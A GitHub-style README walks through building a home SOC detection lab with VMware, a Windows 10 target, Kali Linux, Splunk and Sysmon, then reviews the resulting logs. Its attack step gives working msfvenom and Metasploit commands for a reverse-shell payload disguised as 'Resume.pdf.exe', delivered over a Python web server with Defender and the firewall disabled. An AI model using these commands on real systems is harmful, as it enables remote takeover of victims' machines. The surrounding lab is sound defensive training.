# Basic SOC detection lab

## Objective

The goal of this project is to build a hands-on SOC detection lab that simulates real-world attack scenarios and defensive operations. By creating a controlled environment with logging, monitoring, and alerting, the lab aims to:

- Practice identifying and analyzing malicious activity.
- Develop and test detection rules using SIEM tools (e.g., Splunk).
- Strengthen threat hunting and incident response skills.
- Gain practical, job-ready experience in SOC workflows.

This lab is not just about setting up tools—it’s about learning how attackers operate and how defenders can spot and stop them.

### Skills Learned

- Advanced understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting network logs.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used

- Security Information and Event Management (SIEM) system for log ingestion and analysis (Splunk Enterprise).
- Sysmon for monitoring and generating System logs.
- Attack tools such as Metasploit to simulate attacks and to generate telemetry.

## Host system specifications
- 4 Core Intel i5 8th gen, 16GB ram, 2TB SSD
- Windows 10 64bit
- All softwares and tools used are 64bit versions so you need to check your windows version before the installation. Other than 64bit is the 32bit version.
- To find out your architecture type go to **"Settings > System > About"**, there under **"Device Specification"** you will see your **"System type"**.

## Process

1. Designing an architecture of the detection lab for referencing and ease of organisation.
2. Setting up a Hypervisior, where all our virtual machines will be installed.
3. Installing Windows 10 Pro as our target machine.
4. Installing Kali Linux as our attacking machine.
5. Installing and setup SPLUNK Enterprise on Windows 10 Pro and configuring Sysmon.
6. Setting up the Network configurations.
7. Logs and Malware behaviour analysis.

> [!NOTE]
> All configuration files are included in the repository so you can just download and use them if you wish to.



## Step 1: Designing Setup Architecture

Draw the logical diagram of the architecture using a flowchart maker, I used [Draw.io](https://www.drawio.com/).<br>
In the legend write down the network configs as it will be useful for referencing.

   <img width="1406" height="792" alt="image" src="https://github.com/user-attachments/assets/518fc0be-d4a9-4998-b2ba-66b36d97aff4" />

## Step 2: Setting up a hypervisor VMware Workstation Pro

Install a hypervisor on your host machine, I have use VMware Workstation Pro in this case. You can download it from [this link](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion).<br>
  You can refer to this YouTube video for complete installation steps [VMware Installation](https://www.youtube.com/watch?v=LWfaeLEhsXA).<br>
  It should look something like this after the installation is complete.

   <img width="1912" height="1014" alt="image" src="https://github.com/user-attachments/assets/fd03df93-0efd-4dcf-8505-e673a2a95ad3" />

## Step 3: Installing Windows 10 (Target machine)

1. Now lets create our first Virtual Machine. I will be using Windows 10 as my target machine, Here is the download link for the Windos media creation tool file [Windows 10 Media creation tool](https://www.microsoft.com/en-ca/software-download/windows10).<br>
Media creation tool is the software we will be using to create a Windows 10 ISO image file for our Virtual Machine.<br>
After opening the setup, you will be presented with a window like this:

   <img width="642" height="443" alt="image" src="https://github.com/user-attachments/assets/ee83dbf0-8d3f-4a39-82b4-7e78532a8148" />

2. Select **"Create Installation media"** and click **"Next"**<br>
   I would recommend leaving the settings as is for new users, however you can change your preferred language. Then click **"Next"**

   <img width="642" height="443" alt="image" src="https://github.com/user-attachments/assets/9a0fb91a-f3d0-4ea5-b749-6726b128fe13" />

3. Select **""ISO File""** and click **"Next"**, it should start downloading now. It will also ask you to select a destination folder for the ISO file, In my case im keeping everything in **"Downloads"** folder.

   <img width="642" height="446" alt="image" src="https://github.com/user-attachments/assets/1b900cfa-3964-4466-be56-0a392769d082" />

4. Now to create the Windows VM, head over to VMware window and click on **"Create new virtual machine"**

   <img width="1872" height="993" alt="image" src="https://github.com/user-attachments/assets/d4440006-f6c5-445a-bff9-374f3d3ec9da" />

5. Select **"Typical"** and click **"Next"**

   <img width="430" height="432" alt="image" src="https://github.com/user-attachments/assets/edc83b30-3f09-4689-95ba-7cbfbb863b23" />

6. Select **"Installer disc image file"** and click **"Browse"**. Enter the path where the ISO file is saved. Click **"Next"**,

   <img width="430" height="431" alt="image" src="https://github.com/user-attachments/assets/ba73d404-3eac-4368-8bcb-0f04bcb2391b" />

7. Enter your virtual machine name and where you want to store it. Then click **"Next"**.

   <img width="425" height="428" alt="image" src="https://github.com/user-attachments/assets/a5f59e15-08d8-449e-8ce5-d1ea6801c1a4" />

8. Allocate the disk size. I would recommend atleast 30GB because it would give you a lot of headroom to download and install tools if you wish to, Also splunk SIEM requirs a minimum space free for logs ingestion. Click **"Next"**.

   <img width="428" height="433" alt="image" src="https://github.com/user-attachments/assets/30d6efe3-ccc7-4747-9d8e-00eff6422937" />

9. You can leave it as is but if you have 16 GB ram, i would recommend allocating atleast 4GB. Click on **"Customize Hardware"** and then select **"Memory"** and adjust the slider as needed and click **"OK"**.<br>

   <img width="425" height="431" alt="image" src="https://github.com/user-attachments/assets/f769d9a9-7345-46ea-b884-3afd2dab25ad" /><br>
   <img width="953" height="649" alt="image" src="https://github.com/user-attachments/assets/9abe49a4-2bb9-44dc-9576-47024c236823" /><br> 

> [!NOTE]
> The moment you click **"Finish"** it may display **"Press any key"** message so immidiately click on a key to boot to setup. If u miss this and it says **"Time out"** just restart the Virtual machine from the toolbar: **VM > Power > Restart Guest**.   

10. Make sure the **"Power on this virtual machine after creation"** is checked as it will automatically turn on the VM.

    <img width="425" height="431" alt="image" src="https://github.com/user-attachments/assets/f769d9a9-7345-46ea-b884-3afd2dab25ad" />     
    <img width="1890" height="965" alt="image" src="https://github.com/user-attachments/assets/8455f26b-a224-42bc-9011-d18f39db0d4f" />


11. Now You should see the Windows Setup screen like this and click on **"Next"** after selecting your preferences: 

      <img width="621" height="464" alt="image" src="https://github.com/user-attachments/assets/8a6eeb0e-7279-4e81-9589-3c39135c3551" />

12. Click **"Install Now"**

      <img width="620" height="455" alt="image" src="https://github.com/user-attachments/assets/e8035172-3bc0-4f4a-8fae-1fb64867df62" />

13. If you are like me and don't have a license (T^T) then click on **"I don't have a product key"**.

      <img width="641" height="483" alt="image" src="https://github.com/user-attachments/assets/3d19da93-50a4-4a54-a23a-5f853d9ed669" />

14. Select **"Windows 10 Pro"** as this is the one we would be using, and click **"Next"**.

      <img width="639" height="478" alt="image" src="https://github.com/user-attachments/assets/191eb39d-17d8-4a3f-a9a7-2e38feae7ca1" />

15. Accept the terms and click **"Next"**.

      <img width="642" height="483" alt="image" src="https://github.com/user-attachments/assets/556f2976-b71e-4a4b-8596-51657dbc9f1c" />

16. Select **"Custom"**.

      <img width="635" height="476" alt="image" src="https://github.com/user-attachments/assets/85b16626-d623-4bb5-8590-d32e54c7e571" />

17. Click **"Next"**.

      <img width="643" height="481" alt="image" src="https://github.com/user-attachments/assets/ba12a543-06b4-49e2-8241-de603787966b" />

18. And now your windows should begin installing.
    
      <img width="643" height="482" alt="image" src="https://github.com/user-attachments/assets/46955b03-84ed-4c60-b6a0-e68fe184c55f" />

19. Now setup windows as you would. After the setup is complete and you boot to the desktop, make sure to take a **"snapshot"**. A snapshot is like a config backup that saves the machines state at the time of creating the snapshot.
    It will allow you to restore the machine to the current **"Fresh Install"** state if you break something. Name the snapshot and write a any credientials or info you want in the discription and click **"Take Snapshot"**.
    To revert to a snapshot, in the toolbar: **VM > Snapshot > Revert to a snapshot**

      <img width="762" height="377" alt="image" src="https://github.com/user-attachments/assets/feeb1fbe-0df8-46b9-90a9-027b004cfc35" /><br>

      <img width="461" height="298" alt="image" src="https://github.com/user-attachments/assets/376b00dc-1b9e-4576-89b7-f9f65be030f0" />


## Step 4: Installing Kali Linux (Attacking machine)

1. Kali Linux distro is the one most used to perform tests as it has the necessary tools. Now lets begin the installation. First we need to download the ISO file from Kali's website.<br>
   Go to the website using this link: [Kali VM](https://www.kali.org/get-kali/#kali-virtual-machines) Select the **VMware** option and it will prompt you to save the file in a folder of your choice.<br>
   The download will begin now,

   <img width="1816" height="923" alt="image" src="https://github.com/user-attachments/assets/37f0eb7a-a05b-4e89-8a9f-939661255428" />

2. The downloaded file will be a compressed or a Zip file so we need an "Unzipping" tool. We will be using **"7Zip"**. Download it from this link: [7Zip download](https://www.7-zip.org/),
   Click on **"Download"**. After the download is complete, run the file and it will be installed.

   <img width="685" height="209" alt="image" src="https://github.com/user-attachments/assets/36aa7f5b-fd73-4a1b-a5ad-ff4401d5ea05" />

3. After Kali is downloaded, extract it using 7Zip by right clicking on the file > 7Zip > Extract.

    <img width="1051" height="587" alt="image" src="https://github.com/user-attachments/assets/ae9c3d74-de32-45f1-b37d-5c884b229568" />

4. Open the extracted folder

   <img width="544" height="157" alt="image" src="https://github.com/user-attachments/assets/41fe3f43-093e-4524-a4ff-c6de4f2a8fd8" />

5. Open the folder further and you should see lots of files. Select the file with the extension **".vmx"** and double click it.

   <img width="991" height="431" alt="image" src="https://github.com/user-attachments/assets/21b5b22f-509f-4228-8c9d-7a943c8597c9" />

6. If you are unable to see file extensions, enable it from the toolbar: **"View > File name extensions (Checkbox)"**

   <img width="1008" height="142" alt="image" src="https://github.com/user-attachments/assets/226a3910-80b4-4b2e-89be-ff90eb9c9d93" />

7. After double clicking the file, system will prompt you to select an app to open the file with, if it doesn't open using VMware automatically. Select the VMware Workstation

   <img width="1035" height="567" alt="image" src="https://github.com/user-attachments/assets/a762e83b-4479-4626-a384-e1f08d5ef63c" />

8. Kali will automatically load into the VMware, ready to use. 

    <img width="1881" height="1008" alt="image" src="https://github.com/user-attachments/assets/18529eaa-a653-486a-ad98-4a75c35a5ea7" />

9. Now power on the machine and use the credentials: **username: kali, password: kali** to login for the first time.
    Always change the credentials after logging in for security reasons.<br>
   Just like the windows system, take a Snapshot of the fresh install.


## Step 5: 

### Part 1: Installing SPLUNK Enterprise and configuring it on Windows 10 Pro (VM-target)

1. Power on the Windows 10 Pro VM and update the drivers to their latest versions by going to: **"Settings > Windows Update"**

   <img width="1023" height="798" alt="image" src="https://github.com/user-attachments/assets/13829e30-e0cf-47c5-9b59-a89f1b6dc15e" />

2. After the windows is up to date, open Microsoft Edge and navigate to splunk's website using this link [Splunk Signup](https://www.splunk.com/en_us/form/sign-up.html?redirecturl=https://www.splunk.com/).

   <img width="1637" height="901" alt="image" src="https://github.com/user-attachments/assets/499ed969-92b0-433c-bb8f-90dc30ce9a50" />

3. Create a splunk enterprise account and login, then Click on **"Trials and Downloads"** on the top right corner. Then click on **"Get my free Trial"** button below the **"Splunk Enterprise"** section.

   <img width="1561" height="925" alt="image" src="https://github.com/user-attachments/assets/60fe043f-d1e9-4d31-8d5b-a77299f9285b" />

4. I will take you to a downloads page with several splunk versions. Click on **"Previous Releases"** to see all the options. Make sure you select the **"Windows"** tab.

   <img width="1184" height="605" alt="image" src="https://github.com/user-attachments/assets/3390c30a-967b-4495-8166-1336f96c455b" />

5. At the time of drafting this document, the latest version was **"9.4.4"**, to make sure we have a stable release we will be downloading N-1, i.e, 9.4.3. Also make sure the operating system is mentioned, like for us Windows 10 should be mentioned there.

    <img width="1197" height="727" alt="image" src="https://github.com/user-attachments/assets/53caec89-af38-405f-aa18-ebbeb05b1c74" />

6. Click on **"Download now"** and the download will begin.

      <img width="1258" height="554" alt="image" src="https://github.com/user-attachments/assets/66c27b49-8009-4b3c-803a-1c7dc597c5b7" />

7. After the download is complete, go to downloads and run the splunk file.

      <img width="660" height="262" alt="image" src="https://github.com/user-attachments/assets/844b76b4-262f-4a19-8cf5-2ad2d1aee672" />

8. Agree the license and click **"Customize"**.

     <img width="360" height="284" alt="image" src="https://github.com/user-attachments/assets/68a60bbc-3eb6-47fe-a826-26105f8d72b6" />

9. Here we can set a custom installation path, however I'am going to leave it as default and click **"Next"**

      <img width="363" height="282" alt="image" src="https://github.com/user-attachments/assets/4ecfac1c-603c-4107-a158-9359eb7eaf77" />

10. Since we are on a local account, select **"Local System"** and click **"Next"**

       <img width="362" height="283" alt="image" src="https://github.com/user-attachments/assets/6681c9e4-e10e-4003-91d2-50dec17c7783" />

11. Enter a username and password. We will be using these credentials to loging to the splunk instance.
       <img width="365" height="287" alt="image" src="https://github.com/user-attachments/assets/9f22b28e-e958-4667-97ce-27c0757c157e" />
    
> [!NOTE]
> These credentials and the SPLUNK.COM credentials have nothing to do with each other and can be different.

     

12. Click **"Install"**

      <img width="362" height="281" alt="image" src="https://github.com/user-attachments/assets/14643b17-f592-4f48-93d3-f7af583d3c76" />

13. After the install is complete, and you click **"Finish"**, you should be redirected to splunk web login portal. Alternatively, you can go to your browser of choice and enter: http://localhost:8000 or http://127.0.0.1:8000 to go to the console as splunk web runs on port 8000 by default.

      <img width="1204" height="624" alt="image" src="https://github.com/user-attachments/assets/1cbb2edb-77bf-46be-bb92-cd6908404c88" />

14. Use the credentials created during installation to login and you should be greeted with window like this.

      <img width="1242" height="549" alt="image" src="https://github.com/user-attachments/assets/e26d3ad6-639a-4de0-950a-d9f69faf20c9" />

15. Click on **"Add data"** to add data sources for log ingestion. If you want to take the tour, go ahead.

       <img width="1247" height="591" alt="image" src="https://github.com/user-attachments/assets/df001b09-e983-40c3-b25c-24bf537f950d" />

16. Then click on **"Monitor"**

       <img width="1237" height="594" alt="image" src="https://github.com/user-attachments/assets/5cfc703f-34ff-474a-883a-a5050f54e3e0" />

17. Then click on **"Local Event logs"**

       <img width="1240" height="589" alt="image" src="https://github.com/user-attachments/assets/7e8690e7-b2b8-4f28-838c-a01fea60af91" />

18. Now on the right side select **"System"**, **"Application"** and **"Security"** as these are the logs we want to monitor for now.

       <img width="1224" height="579" alt="image" src="https://github.com/user-attachments/assets/3fbdc179-9b63-4149-a3ae-3b24baf537d7" />

19. Leave it as is for now. Default index is the **"Main"** index so its fine. Then click on **"Review"**.

       <img width="1227" height="572" alt="image" src="https://github.com/user-attachments/assets/b475f6ff-0d40-4691-a93a-62b9a39c28b4" />

20. Now click on **"Submit"** and we should be ready to search the logs!!

       <img width="1229" height="603" alt="image" src="https://github.com/user-attachments/assets/20a04316-8612-408a-a2fc-c64fbad13e4f" /> <br>

       <img width="1238" height="572" alt="image" src="https://github.com/user-attachments/assets/f5eff1c5-024b-4fb8-806d-8c48c9d70b3b" />

21. This is the search window

       <img width="1253" height="581" alt="image" src="https://github.com/user-attachments/assets/87567ea8-2c38-49ca-8483-fdbf09bf7b39" />
    <br>


### Part 2: Sysmon Configuration for Windows 10 Pro
 
Now we have some logs but there is a better way! For that we will be using **"Sysmon"** to get more logs. Now begins the Sysmon setup:

Also the sysmonconfig.xml file is uploaded to this repository so you can just download that one.

1. Download Sysmon from the link: [Sysmon Download](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon). And save the file.

    <img width="1821" height="844" alt="image" src="https://github.com/user-attachments/assets/83a53eca-a3f2-4e1d-ab35-f4ddb530086a" />

2. While Sysmon is downloading, we need a configuration file for sysmon, we will be using [@olafhartong's](https://github.com/olafhartong) configuration file. Link: [Sysmon Configuration File](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml). The file we are looking for is sysmonconfig.xml. Click on **"Raw"**

      <img width="1407" height="801" alt="image" src="https://github.com/user-attachments/assets/16b7deb0-fc25-48af-a271-3ec6206eb1fd" />

3. Select all the file contents with **"CTRL + A"** and then save it using **"CTRL + S"**. Make sure the file name and extension is the same as the below image. For ease of use, save it where the sysmon is being downloaded.

      <img width="1802" height="876" alt="image" src="https://github.com/user-attachments/assets/9952aad1-b94d-4907-a21e-21c69b15f9be" />

4. Extract the Sysmon that has been downloaded

      <img width="464" height="270" alt="image" src="https://github.com/user-attachments/assets/04d95e2f-ce68-4e47-8263-5c5c2d6baad7" />

5. Move the sysmon config file to the extracted folder for ease of use.

      <img width="1111" height="588" alt="image" src="https://github.com/user-attachments/assets/6b691c9b-fe0f-440f-a678-9a4baadba115" />

6.  Open **"Powershell"** with administrator privilages and change directory to the same folder where Sysmon was extracted. 
   
          cd "C:\Users\IEUser\Downloads\Sysmon"

      <img width="857" height="524" alt="image" src="https://github.com/user-attachments/assets/4bd3e6ba-507b-4eba-9e35-4b04d4e14d87" />

7. Now enter command **dir** to see if all files are present in the directory. Then enter the command to install sysmon64(Because I'am using a 64bit machine) using the config file and click enter.

         .\Sysmon64.exe -i .\sysmonconfig.xml
   
   <img width="825" height="400" alt="image" src="https://github.com/user-attachments/assets/b728ea99-89c0-493a-944d-7cfd9677b101" />

8. This should pop up after running the command:

   <img width="230" height="162" alt="image" src="https://github.com/user-attachments/assets/1ff11f21-2ed2-44c3-8939-6fb3deb2ea45" />

9. After agreeing, sysmon should finish installing. You can double check whether sysmon has been installed from **"Services"**. Search services in the **"Start menu"**

   <img width="1020" height="707" alt="image" src="https://github.com/user-attachments/assets/5bd2cba6-17e9-443b-ba76-b4b4459255f6" />

- Congradulations! Sysmon and SPLUNK has been successfully configured but we still need to make SPLUNK ingest logs from SYSMON to do that:


### Part 2: Sysmon Configuration for SPLUNK 

1. Head to where SPLUNK is installed in my case its installed in: **"C:\Program Files\Splunk"**. This is our SPLUNK HOME directory

     <img width="1123" height="593" alt="image" src="https://github.com/user-attachments/assets/4267f983-4336-4999-8539-e0270a9e21e1" />

2. Now head to where the configuration files are stored, i.e, **"/etc/system/local/"**

      <img width="1124" height="591" alt="image" src="https://github.com/user-attachments/assets/b45aff3c-a312-48ec-bc39-ef5efe35a535" />

3. If you dont see an **"inputs.conf"** file, we can copy it from **"/etc/system/default/"**. The file is also uploaded to the repository so you can just download and paste it to your path.

      <img width="1067" height="592" alt="image" src="https://github.com/user-attachments/assets/5cdbd771-80b7-4a79-9b43-ccc5ba74c769" />

4. After adding the file to your local directory, restart your splunkd service from services. Everytime ANY config files are modified, splunk service must be restarted for the new configs to load into memory. If by any chance it shows an error restarting it, just manually stop and start it by right clicking on it.

      <img width="980" height="772" alt="image" src="https://github.com/user-attachments/assets/d0b192dc-e476-4a4a-8e9c-f0b6d3dc0f09" />

5. If you look at the config file, the index listed there is called **"endpoint"**, i.e, the logs are not being stored in the **"main"** index that we configured in splunk before.

      <img width="737" height="514" alt="image" src="https://github.com/user-attachments/assets/99488b1d-17e9-49af-a206-b8f052a7e9c1" />

6. Now we need to create an index named **"endpoint"**. So open SPLUNK web and go to settings.

      <img width="1213" height="528" alt="image" src="https://github.com/user-attachments/assets/d150d378-4a22-46df-a9a5-8fcca7704b3f" />

7. Then navigate to **"indexes"**

      <img width="1229" height="524" alt="image" src="https://github.com/user-attachments/assets/83cb9306-21c9-4f87-851c-c7b3513ab5c7" />

8. Then click on **"Create new index"** and type **"endpoint"** and click **"Save"**.

      <img width="1240" height="571" alt="image" src="https://github.com/user-attachments/assets/99e56ffb-a2b1-481a-b7e1-87b66157dae2" /><br>
      <img width="829" height="529" alt="image" src="https://github.com/user-attachments/assets/954b012e-ba5b-4fbf-afcf-c779d43e5ab5" /><br>
      <img width="1210" height="575" alt="image" src="https://github.com/user-attachments/assets/357806ab-ab17-4ad0-ad95-8fb5672cb7b9" />

9. Now sysmon data is not parsed by splunk automatically so we need to download the **"sysmon add-on"**. So navigate to **"Find more apps"**.

      <img width="601" height="286" alt="image" src="https://github.com/user-attachments/assets/8085f262-72ee-4ab6-88ca-325a50eeefde" />

10. Search sysmon in the search bar and install the add-on. You might have to enter your SPLUNK.COM credentials as the downloads are from the splunk marketplace.

       <img width="1237" height="564" alt="image" src="https://github.com/user-attachments/assets/1985d7e2-fc2e-4c73-95b7-d362513d57a3" />

11. After installing is done, go back to **"Search and Reporting"** and type **"index=endpoint"** now you should see lots of logs!!!!

       <img width="1202" height="558" alt="image" src="https://github.com/user-attachments/assets/c6911f43-3110-4cf5-bad3-991d36ca0f7f" />

- Our splunk and sysmon is perfectly configured to work with each other now.


## Step 6: Setting up Network configurations

Before setting up a network configuration, I will quickly tell you about the different network options available to us

- NAT: This is the default configuration of the VMware, in this config, each vm is assigned a network within the host, all of them have access to the internet.
  
  <img width="913" height="644" alt="image" src="https://github.com/user-attachments/assets/8c3727fb-65fa-424c-a824-ba7ba317ebea" />

- NAT Network: In this network, all VMs have access to the internet but are meshed into a single network.

   <img width="913" height="644" alt="image" src="https://github.com/user-attachments/assets/179ff2b2-e4de-49d3-a0d0-b3c2f03f9a42" />

- Bridged: In this network, the VMs will act as physical machines and will be on the same network as the host machine.
   
   <img width="998" height="644" alt="image" src="https://github.com/user-attachments/assets/829d30b4-247d-4a56-a49a-d1f23cd1fca8" />

- Host only network: These VMs are only accessible to the host machine, they do not have internet access.

   <img width="933" height="645" alt="image" src="https://github.com/user-attachments/assets/7e3be929-2052-4685-9409-573b08a48de5" />

- Lan Segment/Internal Network: The VMs will be in their own network, IP are assigned statically and no communication outside.

   <img width="939" height="648" alt="image" src="https://github.com/user-attachments/assets/e07f799f-fba6-4420-a4ce-3a07ccbb83f9" />

- To summarise, yoy can refer to the following table for the network configs according to your needs:
   | Network Options          | Access To Internet | Use case        |
   |--------------------------|--------------------|-----------------|
   | NAT                      | Yes                | Test Tools      |
   | NAT Network              | YES                | Test Tools      |
   | Bridged                  | YES                | Test Tools      |
   | Host-Only                | NO                 | Analyze Malware |
   | Lan Segment              | NO                 | Analyze Malware |
             

-For this lab, we will be assigning static ip to both windows and splunk Kali machine and make sure they can "talk" to each other. Also Windows defender antivirus and firewall will be diasbled on the VM to make sure the attacks are executed properly and that all ports accept inbound traffic. Bacically we will be going with **"Lan Segment"** configuration.

1. Open VM settings on windows machine and under network adapter settings click on **"Lan Segments..."** and add a lan segment. I have neamed my segment as TEST.

      <img width="933" height="860" alt="image" src="https://github.com/user-attachments/assets/8726b18c-18ce-4863-a387-b04a057b5b67" />

2. Open VM settings on windows machine and set the network connection to **"Lan Segment"** and from the drop down menu select **"TEST"** and click OK.

      <img width="975" height="940" alt="image" src="https://github.com/user-attachments/assets/9f560a20-d514-4099-aef3-42cf86c1436c" />

3. Do the above process for the Kali machine too.

4. In the windows machine open **"control pannel"** and navigate to **"Network and Internet"** > **"Network and Sharing Center"** > **"Change Adapter Settings"**

      <img width="1103" height="505" alt="image" src="https://github.com/user-attachments/assets/8a975ab1-2193-41ec-866d-00521182468b" />

5. Double click **"Ethernet0"** > **"Properties"** > **"Internet Protocol Version 4(TCP/IPv4)"**

      <img width="1159" height="627" alt="image" src="https://github.com/user-attachments/assets/d0746caf-3864-4019-9d2f-feaa31c4c3ba" />

6. Use these settings for static IP configuration and since DNS is left blank, there will be no internet connectivity: click ok and close everything.

      <img width="1121" height="625" alt="image" src="https://github.com/user-attachments/assets/133e9451-ac17-44a5-9e89-fec12a653ab7" />

7. Confirm that static ip is set via running this command in powershell:

         ipfonfig
      
      <img width="712" height="391" alt="image" src="https://github.com/user-attachments/assets/6a8a6505-6a2e-48ed-a075-5c415cebdd82" />

8. Now lets do the same in the Kali machine. Right click on the icon in the picture and select **"Edit Connectionns"**

      <img width="605" height="379" alt="image" src="https://github.com/user-attachments/assets/d34265b0-3a6a-4d8d-b08d-cf20e23d4c64" /><br>
      <img width="605" height="379" alt="image" src="https://github.com/user-attachments/assets/01fd2ef5-ce2c-47c6-bd85-907acbfa59f9" />

9. Now select **"Wired connections"** and click on the gear icon;

      <img width="606" height="479" alt="image" src="https://github.com/user-attachments/assets/8d1b2349-8923-4178-bf70-917374949f6d" />

10. Now select **"IPv4 Settings"**

       <img width="604" height="474" alt="image" src="https://github.com/user-attachments/assets/e1621a22-ee99-4c72-bc5b-f61084cee6da" />

11. No click on DHCP and select manual

       <img width="614" height="483" alt="image" src="https://github.com/user-attachments/assets/cee04bb1-fb0b-4c70-9b45-8267db8dfa0b" />

12. Now click on add:

       <img width="613" height="477" alt="image" src="https://github.com/user-attachments/assets/6daabc7b-6af5-4f97-b88c-28e1f5a187b8" />

13. Now enter the address and click **"Save"** and close everything:

      <img width="699" height="555" alt="image" src="https://github.com/user-attachments/assets/c35ab637-7db1-43f8-96ae-c94dfa0cd4d8" />


14. Open terminal by right clicking on the desktop:

       <img width="602" height="514" alt="image" src="https://github.com/user-attachments/assets/e48fbc9b-0e07-4bd6-bee9-1bb9467c786b" />

15. Run the command to check if IP has been assigned.
       
          ip a
       <img width="858" height="463" alt="image" src="https://github.com/user-attachments/assets/516a9deb-bf2e-42cc-ac03-205dcf618a5b" />

16. check if windows is reachable by pinging the windows ip from terminal

          ping 192.168.20.11
    <img width="652" height="334" alt="image" src="https://github.com/user-attachments/assets/700630bc-d4f5-4053-9034-3e665d9fde8e" />

17. Do the same on windows machine to check if kali is reachable

    <img width="596" height="315" alt="image" src="https://github.com/user-attachments/assets/29f7fc4c-3751-47fa-92e5-4a676dc7e379" />


- We are getting replies in both cases which means connection was successful.

> [!NOTE]
> Remember to disable the firewalls.


## Step 7: Generating logs and catching EVIL!!

1. On the kali machine, run **"nmap"** command to see which ports are open on the windows machine and they are highlighted:

         nmap -A 192.168.20.11 -Pn

      <img width="1583" height="720" alt="image" src="https://github.com/user-attachments/assets/d626d083-1233-40bb-a73f-ca96bcaa16ba" />

> [!CAUTION]
> This lab is purely for learning purposes, DO NOT use these techniques to cause harm or you will get picked up by cops and generally these tactics WILL be detected by antiviruses.

2. Next we need to build our malware. I'll be using **"msfvenom"** to create a malware. These are the commands we can use.

       msfvenom
      <img width="1436" height="673" alt="image" src="https://github.com/user-attachments/assets/8a9a4caf-2fce-4c89-af26-fab9b10b7c27" />

3. To get a list of payloads available to us run this command:

         msfvenom -l payloads
      <img width="1572" height="798" alt="image" src="https://github.com/user-attachments/assets/cfa614f4-4d25-470b-a28a-a130561f920e" />

4. From this list we will be using the reverse tcp payload to create a backdoor on our target windows machine. Now its time to build the malware equiped with this payload. The name of the file will be **"Resume.pdf.exe"**

         msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.12 lport=4444 -f exe -o Resume.pdf.exe
      <img width="894" height="371" alt="image" src="https://github.com/user-attachments/assets/b3fc3464-02f7-49df-8132-f9025531b3a4" />

5. Check if the file is present

         ls
      <img width="973" height="466" alt="image" src="https://github.com/user-attachments/assets/7bef3b9d-763c-4d87-9ac7-2d4950258263" />

6. Now lets open metasploit console

         msfconsole
      <img width="862" height="728" alt="image" src="https://github.com/user-attachments/assets/334f406d-f864-4ca7-b275-2c9d5fed678e" />

7. This console will be used to configure our payload and to interract with the malware once its executed in the target machine. We will use multi handler:

         use exploit/multi/handler
      <img width="489" height="70" alt="image" src="https://github.com/user-attachments/assets/859b86af-fa2c-4f66-9fcf-ea9c6c33a860" />

8. Lets see what we can configure using this command:

         options
      <img width="772" height="323" alt="image" src="https://github.com/user-attachments/assets/c67dd990-bc4f-4805-b2e3-cebb91a00593" />

9. Change the payload to the payload we have used in our malware and run options command:

          set payload windows/x64/meterpreter_reverse_tcp
          options
      <img width="842" height="394" alt="image" src="https://github.com/user-attachments/assets/0548dd19-ef75-4bca-acaa-2cc3a37f3c49" />

10. Set lhost to the IP of attacker machine

          set lhost 192.168.20.12
       <img width="863" height="400" alt="image" src="https://github.com/user-attachments/assets/cd4b0bb7-7e79-429b-8578-211fbce2ff68" />

11. Now lets start the handler so it will be listening for the malware connection:

          exploit
       <img width="809" height="71" alt="image" src="https://github.com/user-attachments/assets/f0b724d5-8294-44ad-bb0f-6c9995518d60" />

12. Now to send the payload to our target machine, we will be setting up a http server on our Kali machine that will host the directory on a port for the target machine to download the file from:
    Open a new terminal tab:
    
       <img width="860" height="287" alt="image" src="https://github.com/user-attachments/assets/b1c06e33-0eed-43db-b8c4-c6176296e455" />

13. Turn on the http server using python on port 9999

           python -m http.server 9999
       <img width="638" height="279" alt="image" src="https://github.com/user-attachments/assets/b34470dd-c7ae-412c-b56a-bc8ce3bf96ec" />

14. Move to the Windows machine and open a web browser and enter the IP and port of the kali machine to access the server:

       <img width="1565" height="438" alt="image" src="https://github.com/user-attachments/assets/3ce62295-963a-482a-8811-f3dbc6bd9b29" />

15. Click on the **"Resume.pdf.exe"** to download it. once its downloaded, run it. Select **"Run"**:

       <img width="531" height="498" alt="image" src="https://github.com/user-attachments/assets/38a9e321-a388-4a37-bdf0-ce1fb18758e2" />


16. To see if a connection has been established, run this command on the windows, scroll down and you will see an established connection:

          netstat -anob
       <img width="841" height="699" alt="image" src="https://github.com/user-attachments/assets/9896c0e9-21b3-47eb-a8ee-5caae03d5ae1" />

17. Back to the Kali machine, on the metasploit console you can see that the backdoor is successful:


       <img width="882" height="145" alt="image" src="https://github.com/user-attachments/assets/8efda176-e9a9-4a33-b7db-e8034bc4a0ad" />

19. Run this command to see what the exploit has to offer:

          help
       <img width="772" height="711" alt="image" src="https://github.com/user-attachments/assets/f690ecb9-446c-4adf-9009-979d18777d1a" />

20. Lets connect to the target's terminal:

          shell
       <img width="733" height="132" alt="image" src="https://github.com/user-attachments/assets/93f0604a-9790-4526-a99d-0754dd2b96c4" />

       
21. Now that the target is at our mercy, lets run some commands:

         net user
         net localgroup
         ipconfig
      <img width="745" height="619" alt="image" src="https://github.com/user-attachments/assets/c742b93a-91c0-43a0-91ec-19cb9842bfec" />
      <img width="665" height="315" alt="image" src="https://github.com/user-attachments/assets/64c57cd8-2710-4e26-909d-462b13a41eaa" />

22. Now lets go back to windows machine and check what logs are available on SPLUNK
       

## Logs and Malware behaviour analysis

   - The file that contained the malware is Resume.pdf(1).exe on the target machine as it was downloaded twice.
         <img width="1327" height="844" alt="image" src="https://github.com/user-attachments/assets/bc85dfd9-2326-4876-bfb6-4243101563eb" /><br>
   - The EventCodes 1116 shows malware detected but not remediated: Our malware was detected by antivirus because realtime protection was not turned off
   - 1117 Shows malware was remediated. we allowed the malware to run and turned off real time protection.
   - If we check the EventCode 1 we will get logs and expanding the first log, we can see that **"Resume.pdf(1).exe"** spawned **"cmd.exe"**. Which is odd for a pdf file.
        <img width="1591" height="632" alt="image" src="https://github.com/user-attachments/assets/124a07a1-60e7-430b-ae40-5f943ca4656b" />
   - We can see that the **"parent_process_exec = Resume.pdf(1).exe"** spawned the **"process_exec = cmd.exe"**. We can further check what the cmd.exe ran by searching the **"process_id = 9728"**
        <img width="1107" height="387" alt="image" src="https://github.com/user-attachments/assets/9af4278f-859b-49e4-ac34-437b15043758" />
